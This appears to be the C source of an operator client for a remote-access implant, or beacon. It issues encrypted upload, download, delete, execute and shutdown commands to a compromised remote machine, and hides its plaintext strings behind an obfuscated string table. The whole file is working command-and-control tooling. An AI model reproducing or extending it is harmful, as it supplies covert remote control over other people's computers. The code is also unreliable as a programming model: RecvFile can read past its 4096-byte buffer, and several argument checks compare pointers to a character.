/*!
 * Client-side Functions
 */
#include "hclient.h"
#include "crypto.h"
#include "proj_strings.h"	//Necessary for strings...
#include "debug.h"

crypt_context *cc;		// Command and control network connection context

/*!
 * int CommandToFunction(char **argv, struct proc_vars *info, crypt_context *ioc)
 * @brief maps the user's command to the correct function
 * @param argv - string vector that holds the command (field1), file/application (field2), and/or file (field3)
 * @param info - pointer to the process data structure
 * @param ioc - I/O connection context
 * @return - returns zero (0) if successful and negative one (-1) on error/failure
 */

int CommandToFunction(char **argv, struct proc_vars *info, crypt_context *ioc)
{
	int retval = 0;

	cc = ioc;	// set command and control context variable that is global to this file
	DLX(8, printf("crypt_context cc = %p\n", cc));

// May want to reconsider comparisons here, had to add strlen(argv[0]) to exec and ex to discriminate or change name from ex to q for quit.

	//if ( ( strncmp( argv[0], "ul", 2) == 0 ) || ( strncmp( argv[0], "up", 2 ) == 0 ) )
	if ((strncmp(argv[0], (const char *) ulString, 2) == 0) || (strncmp(argv[0], (const char *) upString, 2) == 0)) {
		info->command = UPLOAD;
		retval = Upload(argv, info);
	}
	//else if ( ( strncmp( argv[0], "dl", 2 ) == 0 ) || ( strncmp( argv[0], "do", 2 ) == 0 ) ) 
	else if ((strncmp(argv[0], (const char *) dlString, 2) == 0) || (strncmp(argv[0], (const char *) doString, 2) == 0)) {
		info->command = DOWNLOAD;
		retval = Download(argv, info);
	}
	//else if ( strncmp( argv[0], "del", 3 ) == 0 )
	else if (strncmp(argv[0], (const char *) delString, 3) == 0) {
		info->command = DELETE;
		retval = Remove(argv, info);
	}
	//else if ( strncmp( argv[0], "exe", 3 ) == 0 )
	else if (strncmp(argv[0], (const char *) exeString, 3) == 0) {
		info->command = EXECUTE;
		retval = Execute(argv, info);
	}
	//else if ( ( strncmp(argv[0], "exit", 4 ) == 0 ) || ( strncmp( argv[0], "q", 1 ) == 0 ) )
	else if ((strncmp(argv[0], (const char *) exitString, 4) == 0) || (strncmp(argv[0], (const char *) qString, 1) == 0)) {
		info->command = EXIT;
		retval = StopSession(info);
	}
	//else if ( strncmp( argv[0], "shut", 4 ) == 0 )
	else if (strncmp(argv[0], (const char *) shutString, 4) == 0) {
		info->command = SHUTDOWNBOTH;
		retval = StopSession(info);
	} else {
		info->command = HELP;
		DisplayHelp(info->progname);
	}

	return retval;
}

/*!
 * Upload(char **argv, struct proc_vars *info)
 * @brief - called when the user enters the "upload" command to upload a file to the remote host
 * @param argv - argument vector
 * 				argv[0] = command "upload"
 * 				argv[1] = source file/application to upload from the local computer
 *              argv[2] = destination where the file/application will be saved on the remote computer
 *
 * @param info - pointer to the process data structure
 * @return - returns zero (0) on success and non-zero if/when any error occurs at the remote computer
 */
int Upload(char **argv, struct proc_vars *info)
{
	int fd;
	char rfile[255];						// Remote filename
	char lfile[255];						// Local filename
	char *message;
	struct stat st;
	struct send_buf sbuf;
	REPLY rbuf;

	DL(4);
	memset(rfile, 0, 255);
	memset(lfile, 0, 255);
	memset(&sbuf, 0, sizeof(struct send_buf));
	memset(&rbuf, 0, sizeof(struct recv_buf));

	if (argv[3] != '\0') {
		//fprintf(stderr, "\n\tINVALID INPUT! Read User's Guide for correct command format and punctuation!\n\n");
		fprintf(stderr, "%s", upload1String);
		return ERROR;
	}

	if (argv[1] == '\0') {
		//fprintf(stdout, "\tSource file (local)? ");
		fprintf(stdout, "%s", upload2String);
		(void) fgets(lfile, 255, stdin);
		lfile[strlen(lfile) - 1] = '\0';

		if (lfile[0] == '\0') {
			//fprintf(stderr, "\tINVALID INPUT! User must specify a filename to upload to the remote computer!\n");
			fprintf(stderr, "%s", upload3String);
			return ERROR;
		}
	} else {
		strncat(lfile, argv[1], 254);
	}

	if (argv[2] == '\0') {
		//fprintf(stdout, "\tDestination file (remote) [%s]? ", lfile);
		fprintf(stdout, "%s [%s]? ", upload4String, lfile);
		(void) fgets(rfile, 255, stdin);
		rfile[strlen(rfile) - 1] = '\0';

		if (rfile[0] == '\0') {
			strncat(rfile, lfile, 254);
		}
	} else {
		strncat(rfile, argv[2], 254);
	}

	if ((fd = OpenFile(lfile, info)) == ERROR) {
		perror(" openfile()");
		return ERROR;
	}

	strncat(sbuf.path, rfile, strlen(rfile));

	if (stat(lfile, &st) != SUCCESS) {
		// stat() failed to return zero
		perror(" stat():");
		return FAILURE;
	}

	sbuf.size = htonl(st.st_size);

	//fprintf(stdout, "\n\tupload %s (local) to %s (remote) with size %ld\n", lfile, rfile, st.st_size );
	fprintf(stdout, "\n\t%s %s %s %s %s %ld\n", uploadString, lfile, upload5String, rfile, upload6String, (long int)st.st_size);

	DLX(6, printf("Sending command: command: %d, path: %s, size: %lu\n", sbuf.command, sbuf.path, (long unsigned int)st.st_size));
	sbuf.command = UPLOAD;
	SendCommand(&sbuf, &rbuf, info);

	if (rbuf.reply == 0) {
		if ((rbuf.reply = SendFile(fd, (size_t)st.st_size)) == 0) {
			//(void) asprintf(&message, "successful upload of %d bytes from %s to %s\n", (int)st.st_size, lfile, rfile);
			(void) asprintf(&message, "%s %d %s %s to %s\n", upload7String, (int) st.st_size, upload8String, lfile,
				      rfile);
		} else {
			//(void) asprintf(&message, "application/network errors occurred during upload\n");
			(void) asprintf(&message, "%s", upload9String);
		}
	} else {
		//(void) asprintf(&message, "unsuccessful upload due to problems at remote computer\n");
		(void) asprintf(&message, "%s", upload10String);
	}

	fprintf(stdout, "\t%s\n", message);

	if (message != NULL)
		free(message);

	close(fd);

	return (rbuf.reply);
}

/* ******************************************************************************************************************************
 *
 * Download(char** argv, struct proc_vars* info)
 * Description -- function is called when the user enters the "download" command
 * Parameters  -- argv = argument vector; argv[0] = command "download", argv[1] = source file/application to download
 *                       from the remote computer, and argv[2] = destination where the file/application will be saved on the
 *                       local computer
 *                info = pointer to the process data structure
 * Return      -- returns zero (0) on success and non-zero if/when any error occurs at the remote computer
 *
 * **************************************************************************************************************************** */

int Download(char **argv, struct proc_vars *info)
{
	int fd;
	char rfile[255];						// Remote filename
	char lfile[255];						// Local filename
	char *tptr;
	char *message;
	struct send_buf sbuf;
	REPLY rbuf;

	DL(4);
	memset(rfile, 0, 255);
	memset(lfile, 0, 255);
	memset(&sbuf, 0, 264);
	memset(&rbuf, 0, 8);
	if (argv[3] != '\0') {
		//fprintf(stderr, "\n\tINVALID INPUT! Read User's Guide for correct command format and punctuation!\n\n");
		fprintf(stderr, "%s", upload1String);
		return ERROR;
	}
	if (argv[1] == '\0') {
		//fprintf(stdout, "\tSource file (remote)? ");
		fprintf(stdout, "%s", download2String);
		(void) fgets(rfile, 255, stdin);
		rfile[strlen(rfile) - 1] = '\0';
		if (rfile[0] == '\0') {
			//fprintf(stderr, "\tINVALID INPUT! User must specify a filename to download to the local computer!\n");
			fprintf(stderr, "%s", download3String);
			return ERROR;
		}
	} else {
		strncat(rfile, argv[1], 254);
	}
	if (argv[2] == '\0') {
		//fprintf(stdout, "\tDestination file (local) [%s]? ", rfile);
		fprintf(stdout, "%s [%s]? ", download4String, rfile);
		(void) fgets(lfile, 255, stdin);
		lfile[strlen(lfile) - 1] = '\0';
		if (lfile[0] == '\0') {
			strncat(lfile, rfile, 254);
		}
	} else {
		strncat(lfile, argv[2], 254);
	}
	tptr = lfile;
	while ((tptr = strchr(tptr, 0x20)) != NULL) {
		*tptr = '_';
	}
	if ((fd = OpenFile(lfile, info)) == ERROR) {
		return ERROR;
	}
	//(void) asprintf(&message, "download %s %s\n", rfile, lfile);
	(void) asprintf(&message, "%s %s %s\n", downloadString, rfile, lfile);
	fprintf(stdout, "\n\t%s", message);
	free(message);
	strncat(sbuf.path, rfile, strlen(rfile));
	sbuf.command = DOWNLOAD;
	SendCommand(&sbuf, &rbuf, info);
	DLX(6, printf("Reply code from remote: 0x%lx - 0x%lx\n", rbuf.reply, rbuf.padding));
	if (rbuf.reply == 0) {
		DLX(6, printf("Receiving file, size: %lu\n", (unsigned long)ntohl(rbuf.padding)));
		if ((rbuf.reply = RecvFile(fd, ntohl(rbuf.padding))) == 0) {
			//(void) asprintf(&message, "successful download of %d bytes from %s to %s\n", ntohl(rbuf.padding), rfile, lfile);
			(void) asprintf(&message, "%s %d %s %s to %s\n", download5String, ntohl(rbuf.padding), upload8String, rfile,
				      lfile);
		} else {
			//(void) asprintf(&message, "application/network errors occurred during download\n");
			(void) asprintf(&message, "%s", download6String);
		}
	} else {
		//(void) asprintf(&message, "unsuccessful download due to problems at remote computer\n");
		(void) asprintf(&message, "%s", download7String);
	}
	fprintf(stdout, "\t%s\n", message);
	free(message);

	close(fd);
	return (rbuf.reply);
}

/* ******************************************************************************************************************************
 *
 * Remove(char** argv, struct proc_vars* info)
 * Description -- function is called when the user enters the "delete" command
 * Parameters  -- argv = argument vector; argv[0] = command "delete" and argv[1] = file/application to delete on the remote
 *                       computer
 *                info = pointer to the process data structure
 * Return      -- returns zero (0) on success and non-zero if/when any error occurs at the remote computer
 *
 * **************************************************************************************************************************** */

int Remove(char **argv, struct proc_vars *info)
{
	char rfile[255];
	char *message;
	struct send_buf sbuf;
	REPLY rbuf;

	DL(4);
	memset(rfile, 0, 255);
	memset(&sbuf, 0, 264);
	memset(&rbuf, 0, 8);
	if (argv[2] != '\0') {
		//fprintf(stderr, "\n\tINVALID INPUT! Read User's Guide for correct command format and punctuation!\n\n");
		fprintf(stderr, "%s", upload1String);
		return ERROR;
	}
	if (argv[1] == '\0') {
		//fprintf(stdout, "\tFile/application to delete (remote)? ");
		fprintf(stdout, "%s", remove1String);
		(void) fgets(rfile, 255, stdin);
		rfile[strlen(rfile) - 1] = '\0';
		if (rfile[0] == '\0') {
			//fprintf(stderr, "\tINVALID INPUT! User must specify a filename to delete on the remote computer!\n");
			fprintf(stderr, "%s", remove2String);
			return ERROR;
		}
	} else {
		strncat(rfile, argv[1], 254);
	}
	//(void) asprintf(&message, "delete %s\n", rfile);
	(void) asprintf(&message, "%s %s\n", deleteString, rfile);
	fprintf(stdout, "\n\t%s", message);
	free(message);
	strncat(sbuf.path, rfile, strlen(rfile));
	sbuf.command = DELETE;
	SendCommand(&sbuf, &rbuf, info);
	if (rbuf.reply == 0) {
		//(void) asprintf(&message, "successful deletion of remote file %s\n", rfile);
		(void) asprintf(&message, "%s %s\n", remove3String, rfile);
	} else {
		//(void) asprintf(&message, "unsuccessful deletion due to problems at remote computer\n");
		(void) asprintf(&message, "%s", remove4String);
	}
	fprintf(stdout, "\t%s\n", message);
	free(message);

	return (rbuf.reply);
}

/* ******************************************************************************************************************************
 *
 * Execute(char** argv, struct proc_vars* info)
 * Description -- function is called when the user enters the "execute" command
 * Parameters  -- argv = argument vector; argv[0] = command "execute" and argv[1] = name of the application to be executed
 *                info = pointer to the process data structure
 * Return      -- returns zero (0) on success and non-zero if/when any error occurs at the remote computer
 *
 * **************************************************************************************************************************** */

int Execute(char **argv, struct proc_vars *info)
{
	char rfile[255];
	char *message;
	struct send_buf sbuf;
	REPLY rbuf;

	DL(4);
	memset(rfile, 0, 255);
	memset(&sbuf, 0, 264);
	memset(&rbuf, 0, 8);
	if (argv[2] != '\0') {
		//fprintf(stderr, "\n\tINVALID INPUT! Read User's Guide for correct command format and punctuation!\n\n");
		fprintf(stderr, "%s", upload1String);
		return ERROR;
	}
	if (argv[1] == '\0') {
		//fprintf(stdout, "\tApplication to execute (remote)? ");
		fprintf(stdout, "%s", execute1String);
		(void) fgets(rfile, 255, stdin);
		rfile[strlen(rfile) - 1] = '\0';
		if (rfile[0] == '\0') {
			//fprintf(stderr, "\tINVALID INPUT! User must specify an application to execute on the remote computer!\n");
			fprintf(stderr, "%s", execute2String);
			return ERROR;
		}
	} else {
		strncat(rfile, argv[1], 254);
	}
	//(void) asprintf(&message, "execute \"%s\"\n", rfile);
	(void) asprintf(&message, "%s \"%s\"\n", executeString, rfile);
	fprintf(stdout, "\n\t%s", message);
	free(message);
	strncat(sbuf.path, rfile, strlen(rfile));
	sbuf.command = EXECUTE;
	SendCommand(&sbuf, &rbuf, info);
	DLX(6, printf("Reply code from remote: %lu\n", rbuf.reply));
	if (rbuf.reply == 0) {
		//(void) asprintf(&message, "successful execution of remote application \"%s\"\n", rfile);
		(void) asprintf(&message, "%s \"%s\"\n", execute3String, rfile);
	} else {
		//(void) asprintf(&message, "unsuccessful execution due to problems at remote computer\n");
		(void) asprintf(&message, "%s", execute4String);
	}
	fprintf(stdout, "\t%s\n", message);
	free(message);

	return (rbuf.reply);
}

/* ******************************************************************************************************************************
 *
 * StopSession(struct proc_vars* info)
 * Description -- function is called when the user enters the "exit" or "shutdown" commands
 * Parameters  -- info = pointer to the process data structure
 * Return      -- returns zero (0) on success and non-zero if/when any error occurs at the remote computer
 * NOTE        -- it is bad to send "shutdown" with either socket type but must be necessary at times; it is bad to send
 *                "exit" only when the socket type is listen but must be necessary at times
 *
 * **************************************************************************************************************************** */

int StopSession(struct proc_vars *info)
{
	char question[4];
	char *message;
	struct send_buf sbuf;
	REPLY rbuf;

	DL(4);
	memset(&sbuf, 0, 264);
	memset(&rbuf, 0, 8);

	if ((info->listen == YES) && ((info->command == EXIT) || (info->command == SHUTDOWNBOTH))) {
		memset(question, 0, 4);

		if (info->command == SHUTDOWNBOTH) {
			fprintf(stdout, "\n");
			//fprintf(stdout, "    WARNING (SHUTDOWN COMMAND)! You are about to close BOTH this session AND terminate the beacon's process.\n");
			fprintf(stdout, "%s", stopSession1String);
			//fprintf(stdout, "    Do you want to continue? (yes/no): ");
			fprintf(stdout, "%s", stopSession2String);
		} else if (info->command == EXIT) {
			fprintf(stdout, "\n");
			//fprintf(stdout, "    WARNING (EXIT COMMAND)! You are about to close your session, but the beacon will continue processing.\n");
			fprintf(stdout, "%s", stopSession3String);
			//fprintf(stdout, "    Do you want to continue? (yes/no): ");
			fprintf(stdout, "%s", stopSession2String);
		}

		(void) fgets(question, 4, stdin);

		if (strncmp(question, "yes", 3) != 0) {
			info->command = HELP;
			return ERROR;
		}

		if (info->command == SHUTDOWNBOTH) {
			//(void) asprintf(&message, "shutdown (command confirmed with the operator)\n");
			(void) asprintf(&message, "%s", stopSession4String);
		} else {
			//(void) asprintf(&message, "exit (command confirmed with the operator)\n");
			(void) asprintf(&message, "%s", stopSession5String);
		}

	} else if ((info->listen == NO) && (info->command == SHUTDOWNBOTH)) {
		memset(question, 0, 4);

		//fprintf(stdout, "\tWARNING! ARE YOU SURE YOU WANT TO SHUTDOWN THE REMOTE SERVER AND CONNECTION (yes/no)? ");
		fprintf(stdout, "%s", stopSession6String);

		(void) fgets(question, 4, stdin);

		if (strncmp(question, "yes", 3) != 0) {
			info->command = HELP;
			return ERROR;
		}
		//(void) asprintf(&message, "shutdown (command confirmed with the operator)\n");
		(void) asprintf(&message, "%s", stopSession7String);
	} else {
		//(void) asprintf(&message, "exit\n");
		(void) asprintf(&message, "%s\n", exitString);
	}

	fprintf(stdout, "\n\t%s", message);
	free(message);

	sbuf.command = info->command;
	SendCommand(&sbuf, &rbuf, info);

	if (rbuf.reply == 0) {
		if ((info->command == EXIT) && (info->listen == NO)) {
			//(void) asprintf( &message, "TCP socket disconnected\n" );
			(void) asprintf(&message, "%s", stopSession8String);
		} else if ((info->command == EXIT)) {
			//(void) asprintf( &message, "TCP socket disconnected\n" );
			(void) asprintf(&message, "%s", stopSession8String);
		} else {
			//(void) asprintf(&message, "server shutdown and TCP socket disconnected\n");
			(void) asprintf(&message, "%s", stopSession9String);
		}
	} else {
		//(void) asprintf(&message, "remote command failed due to problems at remote computer\n");
		(void) asprintf(&message, "%s", stopSession10String);
	}

	fprintf(stdout, "\t%s\n", message);
	free(message);

	close(info->tcpfd);
	return (rbuf.reply);
}

/* ******************************************************************************************************************************
 *
 * DisplayHelp(char* progname)
 * Description -- function displays the list of commands and their usage when/if the user enters [? | h | help] at the
 *                program's prompt
 * Parameters  -- progname = this program's binary file name; to be used as the program's prompt
 * Return      -- void
 *
 * **************************************************************************************************************************** */

void DisplayHelp(char *progname)
{
	//fprintf(stdout, "\n*****************************************************************************************************************\n\n");
	fprintf(stdout, "%s", displayHelp1String);
	//fprintf(stdout, "List of allowable commands:\n");
	fprintf(stdout, "%s", displayHelp2String);
	//fprintf(stdout, "   [execute | exec | exe] = execute an application on the remote computer\n");
	fprintf(stdout, "%s", displayHelp3String);
	//fprintf(stdout, "   [upload | ul | up]     = upload a file to the remote computer\n");
	fprintf(stdout, "%s", displayHelp4String);
	//fprintf(stdout, "   [download | dl]        = download a file to the local computer (i.e., this computer)\n");
	fprintf(stdout, "%s", displayHelp5String);
	//fprintf(stdout, "   [delete | del]         = delete a file on the remote computer\n");
	fprintf(stdout, "%s", displayHelp6String);
	//fprintf(stdout, "   [exit | q]             = close the TCP connection but keep the server running on the remote computer\n");
	fprintf(stdout, "%s", displayHelp7String);
	//fprintf(stdout, "   [shutdown | shut]      = close the TCP connection and stop the server running on the remote computer\n");
	fprintf(stdout, "%s", displayHelp8String);
	//fprintf(stdout, "   [help]                 = display this help information\n\n");
	fprintf(stdout, "%s", displayHelp9String);
	//fprintf(stdout, "Format of the allowable commands:\n");
	fprintf(stdout, "%s", displayHelp10String);
	//fprintf(stdout, "   %s> exec <application :: remote>\n", progname);
	fprintf(stdout, "   %s> %s>\n", progname, displayHelp11String);
	//fprintf(stdout, "   %s> ul <src file :: local> <dest file :: remote>\n", progname);
	fprintf(stdout, "   %s> %s>\n", progname, displayHelp12String);
	//fprintf(stdout, "   %s> dl <src file :: remote> <dest file :: local>\n", progname);
	fprintf(stdout, "   %s> %s>\n", progname, displayHelp13String);
	//fprintf(stdout, "   %s> del <file :: remote>\n", progname);
	fprintf(stdout, "   %s> %s>\n", progname, displayHelp14String);
	//fprintf(stdout, "   %s> exit\n", progname);
	fprintf(stdout, "   %s> %s\n", progname, exitString);
	//fprintf(stdout, "   %s> shut\n", progname);
	fprintf(stdout, "   %s> %s\n", progname, shutString);
	//fprintf(stdout, "   %s> help\n\n", progname);
	fprintf(stdout, "   %s> %s\n\n", progname, helpString);
	//fprintf(stdout, "NOTE: <file/application :: remote/local> defines the locality of the file or application.\n");
	fprintf(stdout, "%s", displayHelp15String);
	//fprintf(stdout, "\n*****************************************************************************************************************\n\n");
	fprintf(stdout, "%s", displayHelp1String);
}


/*!
 * SendFile(char* filename, int fsize)
 * @brief sends a file from the local computer; used with the upload command/function
 * @param fd - file descriptor to the file on the local computer
 * @param size - size of file to be uploaded to the remote computer
 * @return - returns zero (0) on success and non-zero if any error(s) occur
 */
int SendFile(int fd, size_t size)
{
	int rbytes, wbytes, ret;
	unsigned int total_bytes_sent = 0;
	unsigned char buffer[4096];
	struct recv_buf rbuf;

	DLX(8, printf("Sending %lu byte file...\n", (unsigned long)size));
	while (total_bytes_sent < size) {
		memset(buffer, 0, 4096);

		// Read the local file
		if ((rbytes = read(fd, buffer, 4096)) < 0) {
			perror("\tSendFile()");
			return ERROR;
		}
		// Sent bytes read to the remote file
		wbytes = 0;
		while (wbytes < rbytes) {
			if ((ret = crypt_write(cc, buffer, rbytes)) < 0) {
				//fprintf(stderr, "\tSendFile(): failure sending data to the remote computer\n");
				fprintf(stderr, "%s", sendFile1String);
				return ERROR;
			}
			wbytes += ret;
		}
		total_bytes_sent += rbytes;
	}
	DLX(8, printf("Sent %lu bytes\n", (unsigned long)size));

	// Get the result of the remote's upload file command
	if ((crypt_read(cc, (unsigned char *) &rbuf, sizeof(REPLY))) <= 0) {
		//fprintf(stderr, "\tSendFile(): failure receiving acknowledgment from the remote computer\n");
		fprintf(stderr, "%s", sendFile2String);
		return ERROR;
	}
	DLX(8, printf("Remote results: %lu\n", rbuf.reply));
	// returns zero on success
	return (rbuf.reply);
}

/*!
 * RecvFile(int fd, int size)
 * @brief RecvFile receives a file from the remote computer -- used with the download command/function
 * @param fd -- file descriptor of the file on the local computer
 * @param size -- size of the file to be downloaded
 * @returns - 0 is successful or -1 on error
 */
int RecvFile(int fd, int size)
{
	int rbytes, wbytes;
	unsigned char buffer[4096];
	struct recv_buf rbuf;

	DLX(8, printf("Receiving %d byte file...\n", size));
	while (size > 0) {
		memset(buffer, 0, 4096);

		DLX(8, printf("crypt_context: %p\n", cc));
		if ((rbytes = crypt_read(cc, buffer, MAX(size,4096))) < 0) {
			//fprintf(stderr, "\tRecvFile(): failure receiving data from the remote computer\n");
			fprintf(stderr, "%s", recvFile1String);
			return ERROR;
		}

		DLX(8, printf("Received %d bytes\n", rbytes));
		// Write received bytes to the local file (fd)
		wbytes = 0;
		do {
			if ((wbytes += write(fd, buffer, rbytes)) < 0) {
				perror("\tRecvFile()");
				return ERROR;
			}
		} while (wbytes < rbytes);

		size -= rbytes;
	}

	// Get result of remote command
	DL(8);
	if ((rbytes = crypt_read(cc, (unsigned char *) &rbuf, 8)) < 0) {
		//fprintf(stderr, "\tRecvFile(): failure receiving acknowledgment from the remote computer\n");
		fprintf(stderr, "%s", recvFile2String);
		return ERROR;
	}
	return (rbuf.reply);
}

// ******************************************************************************************************************************

/*!
 * void SendCommand(struct send_buf *sbuf, REPLY *rbuf, struct proc_vars *info)
 * @brief Sends the user's command to the remote computer for processing
 * @param sbuf - the buffered data that will be sent to the remote computer for processing
 * @param rbuf - the buffered data that will receive the remote computer's response to the sent command
 * @param info - pointer to the process data structure
 */
void SendCommand(struct send_buf *sbuf, REPLY *rbuf, struct proc_vars *info)
{
	info = info;	// Silence compiler warning about this unused parameter

	DLX(4, printf("Sending command\n"));
	if (crypt_write(cc, (unsigned char *) sbuf, 264) <= 0) {
		//fprintf(stderr, "\tSendCommand(): failure sending request to the remote computer\n");
		fprintf(stderr, "%s", sendCommand1String);
		rbuf->reply = htonl(ERROR);
		return;
	}

	if (crypt_read(cc, (unsigned char *) rbuf, sizeof(REPLY)) <= 0) {
		//fprintf(stderr, "\tSendCommand(): failure receiving response from the remote computer\n");
		fprintf(stderr, "%s", sendCommand2String);
		rbuf->reply = htonl(ERROR);
		return;
	}
	DLX(8, printf("Reply: 0x%lx, padding = 0x%lu\n", rbuf->reply, rbuf->padding));
	return;
}
